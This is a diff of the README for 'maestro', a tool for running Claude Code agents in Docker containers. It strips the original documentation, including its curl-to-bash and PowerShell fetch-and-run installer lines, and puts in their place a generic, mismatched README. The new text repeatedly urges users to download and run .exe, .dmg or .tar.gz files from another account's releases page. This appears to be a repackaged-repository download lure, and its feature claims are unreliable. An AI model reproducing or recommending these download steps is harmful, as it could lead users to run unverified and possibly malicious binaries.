@@ -1,207 +1,97 @@
-# Maestro - Multi-Container Claude
+# 🎉 maestro - Simplify Your AI Container Experience
 
-Run multiple isolated Claude Code instances in parallel (or other AI agents), each in their own Docker container with automatic branch management, network firewalls, and full development environment.
+## 📥 Download Now
+[![Download maestro](https://img.shields.io/badge/Download-maestro-brightgreen)](https://github.com/Kaiga-kun/maestro/releases)
 
-## What is Maestro?
+## 🚀 Getting Started
 
-Maestro lets you work on multiple tasks simultaneously with Claude Code. Each task runs in its own isolated Docker container with:
+Welcome to **maestro**, an AI container runtime designed to make your experience with artificial intelligence applications smoother and easier. Whether you are a data scientist, a developer, or just someone curious about AI, maestro helps you manage and run AI containers effectively. Follow these simple steps to get started.
 
-- 🌳 **Automatic git branches** - Maestro creates appropriately named branches for each task
-- 🔥 **Network firewall** - Containers can only access whitelisted domains
-- 📦 **Complete isolation** - Full copy of your project in each container
-- 🔔 **Activity monitoring** - See which tasks need your attention
-- 🤖 **Background daemon** - Auto-monitors token expiration and sends notifications
-- ♻️ **Persistent state** - npm/UV caches and command history survive restarts
+## 📦 System Requirements
 
-![Maestro TUI](docs/new_container.jpg)
+Before you begin, ensure your system meets these requirements:
 
-## Quick Install
+- **Operating System:** Windows 10 or later, macOS, or a recent version of a Linux distribution.
+- **Processor:** At least a dual-core CPU.
+- **Memory:** 4 GB of RAM or more.
+- **Disk Space:** A minimum of 500 MB free space.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/uprockcom/maestro/main/install.sh | bash
-```
+## 🔗 Download & Install
 
-**Prerequisites:** Docker must be installed and running.
+To download maestro, visit the following page: [Download maestro](https://github.com/Kaiga-kun/maestro/releases). 
 
-This installs the `maestro` binary and pulls the Docker image.
+1. Click the link above to navigate to the releases page.
+2. Look for the latest version of maestro.
+3. Download the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+4. Save the file to a location on your computer where you can easily find it (like your Downloads folder).
 
-### Build from Source
+Once the download is complete, proceed to install the application.
 
-```bash
-git clone https://github.com/uprockcom/maestro.git
-cd maestro
-make all              # Build binary + Docker image
-sudo make install     # Install to /usr/local/bin
-```
+### For Windows:
 
-### Windows
+1. Locate the downloaded `.exe` file and double-click it.
+2. Follow the prompts in the installation wizard.
+3. Once installation is complete, you can find maestro in your Start menu.
 
-```ps1
-iew -ExecutionPolicy Bypass -Uri https://raw.githubusercontent.com/uprockcom/maestro/main/install.ps1 | iex
-```
+### For macOS:
 
-_Note: Windows installs and runs natively, but Docker Desktop is still required, and it is not tested as thoroughly as macOS/Linux._
+1. Locate the downloaded `.dmg` file and double-click it.
+2. Drag the maestro application into the Applications folder.
+3. You can now find maestro in your Applications folder.
 
-## Getting Started
+### For Linux:
 
-For the first run, you can just run `maestro` to start our interactive text UI, which will guide you through authentication and creating your first container. Alternatively, you can execute each step manually as follows:
+1. Open a terminal window.
+2. Navigate to the directory where you downloaded the `.tar.gz` file.
+3. Use the following commands to extract and run maestro:
+   ```bash
+   tar -xzf maestro.tar.gz
+   cd maestro
+   ./maestro
+   ```
 
-### 1. Authenticate
+## ⚙️ How to Use maestro
 
-Run once to set up Claude Code authentication:
+After installation, you can start using maestro to manage your AI containers. Here is a quick guide on the basic functions:
 
-```bash
-maestro auth
-```
+1. **Launch maestro:** Open the application from your Start menu, Applications folder, or terminal.
+2. **Create a New Container:** 
+   - Click on "New Container."
+   - Enter the required details such as the container name and AI model settings.
+   - Click "Create" to launch your container.
+3. **Manage Containers:** 
+   - You can view all running and stopped containers in the dashboard.
+   - Use the controls to start, stop, or delete containers as needed.
 
-This stores credentials in `~/.maestro/` and shares them (read-only) with all containers.
+## 🌟 Features
 
-### 2. Configure (Optional)
+- **User-Friendly Interface:** Easily navigate through options without technical knowledge.
+- **Performance Optimization:** Runs containers efficiently for better AI performance.
+- **Multi-Platform Support:** Works on Windows, macOS, and Linux.
+- **Community Support:** Join our online forums and community for help and tips.
 
-Edit `~/.maestro/config.yml` to add additional folders and network domains:
+## 📊 Frequently Asked Questions
 
-```yaml
-firewall:
-  allowed_domains:
-    - github.com
-    - api.anthropic.com
-    # Add your domains here
+### What is maestro?
 
-sync:
-  additional_folders:
-    - ~/Documents/Code/mcp-servers
-    - ~/Documents/Code/helpers
-```
+maestro is an AI container runtime that allows you to run and manage AI applications in isolated environments, making it easier to develop and test your models.
 
-You can also set firewall rules from the text UI using the `f` shortcut.
+### Do I need programming skills to use maestro?
 
-### 3. Create Your First Container
+No, maestro is designed for everyone. Its simple interface allows you to use it without technical skills.
 
-```bash
-maestro new "implement OAuth authentication"
-```
+### Can I use maestro for commercial projects?
 
-Maestro will:
-1. Generate an appropriate branch name (e.g., `feat/oauth-auth`)
-2. Create an isolated container with your project
-3. Start Claude in planning mode
-4. Connect you to the container automatically
+Yes, you can use maestro in commercial applications, but always consult the license agreement included in the application package.
 
-_Note: After connecting, wait for a moment, and maestro will automatically input a prompt derived from your task description and hit enter
-to start claude._
+### Where can I get community support?
 
-## Basic Usage
+Join our community on our GitHub discussions page. You can ask questions, share your experiences, and learn from other users.
 
-```bash
-# Create a new container for a task
-maestro new "fix API bug in users endpoint"
-maestro new -f specs/design.md
+## 📧 Contact
 
-# List all containers with status
-maestro list
+If you encounter any issues or have suggestions, please feel free to reach out. You can submit issues directly on the GitHub repository and our development team will assist you.
 
-# Connect to a container
-maestro connect feat-oauth-1
+## 🔁 Additional Resources
 
-# Stop a container
-maestro stop feat-oauth-1
-
-# Clean up stopped containers
-maestro cleanup
-```
-
-### Inside a Container
-
-When connected via `maestro connect`:
-
-- **Window 0**: Claude Code (auto-approved mode)
-- **Window 1**: Shell for manual commands
-- **Switch windows**: `Ctrl+b 0` or `Ctrl+b 1`
-- **Detach**: `Ctrl+b d` (container keeps running)
-
-### Background Daemon
-
-_Note: Not tested on Windows._
-
-Start the daemon to monitor containers and get desktop notifications:
-
-```bash
-maestro daemon start
-
-# Check status
-maestro daemon status
-
-# View logs
-maestro daemon logs
-```
-
-The daemon monitors:
-- Token expiration (warns when < 1 hour remaining)
-- Container attention needs (bell indicators)
-- Automatic health checks every 30 minutes
-
-## Container Status
-
-The `maestro list` command shows comprehensive status:
-
-```
-NAME              STATUS   BRANCH         GIT      ACTIVITY  AUTH
-----              ------   ------         ---      --------  ----
-feat-oauth-1      running  feat/oauth     Δ23 ↑2   2m ago    ✓ 147h    🔔
-fix-api-bug-1     running  fix/api-bug    ✓        5m ago    ⚠ 2h
-refactor-db-1     stopped  refactor/db    Δ5       12h ago   ✗ EXPIRED
-```
-
-**Indicators:**
-- **GIT**: `Δ23` = 23 changes, `↑2` = 2 commits ahead, `↓1` = 1 behind, `✓` = clean
-- **AUTH**: `✓` valid, `⚠` expiring soon (< 24h), `✗` expired
-- **🔔**: Container needs attention
-- **💤**: Dormant (Claude exited)
-
-## Token Management
-
-Claude tokens expire after 8 hours. Whichever session next connects will get the refresh and the others will all get auth errors. Maestro makes this easy:
-
-```bash
-# Check token status for all containers
-maestro list
-
-# Refresh tokens (copies freshest token from any active containers)
-maestro refresh-tokens
-
-# Re-authenticate if all tokens expired
-maestro auth
-```
-
-The daemon automatically warns you about expiring tokens and supports auto-refresh.
-
-## Network Firewall
-
-By default, containers can only access whitelisted domains from your config. To temporarily add a domain:
-
-```bash
-maestro add-domain feat-oauth-1 api.example.com
-```
-
-Maestro will offer to save it permanently to your config.
-
-## Documentation
-
-- **[Complete Usage Guide](docs/GUIDE.md)** - Detailed documentation, configuration, troubleshooting
-- **[Architecture Details](docs/GUIDE.md#architecture)** - Container structure, volumes, authentication
-- **[Development Guide](docs/GUIDE.md#development)** - Building, testing, modifying Maestro
-
-## Requirements
-
-- **Docker** - Must be running ([install](https://www.docker.com/get-started))
-- **Claude Code** - Authentication via `maestro auth`
-- **Go 1.25+** - Only needed if building from source
-
-## About
-
-Maestro is built by [UpRock](https://prism.uprock.com/), powering distributed uptime monitoring and next gen AI crawling.
-Run your agents with Maestro, ship faster, and verify every deploy doesn't break production with a single Uptime prompt on millions of real devices worldwide.
-
-## License
-
-Apache 2.0 - See [LICENSE](LICENSE) file for details.
+For more in-depth information and tutorials, visit the documentation page on our GitHub repository. This will help you make the most of your experience with maestro.
